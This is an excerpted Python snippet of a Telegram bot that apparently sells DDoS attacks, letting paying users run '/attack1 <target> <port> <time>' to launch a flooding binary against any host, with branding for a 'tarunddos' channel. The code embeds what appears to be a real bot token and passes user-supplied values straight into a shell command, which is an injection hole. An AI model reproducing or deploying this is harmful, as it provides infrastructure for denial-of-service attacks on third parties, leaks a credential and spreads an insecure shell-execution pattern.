...
bot = telebot.TeleBot('7307604915:AAEbKsLQQpWxA3ZA5wcWGJsCviDM1ZYhWrI')
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 300:
                ...
                full_command = f"./KALALUND {target} {port} {time} LUND"
                subprocess.run(full_command, shell=True)
                response = f"KALIAYT 🚀\nAttack1 Finished. \n📡 Target: {target} \n🔌 Port: {port} \n⏱️ Time: {time} \n BY https://t.me/tarunddos"
        else:
            response = "Usage :- /attack1 <target> <port> <time>\nBy https://t.me/tarunddos"  # Updated command syntax
    else:
        response = "You Are Not User's To Authorized To Use This Command.\nBy STORM BOT DM TO GET ACCESS @tarun_4k"
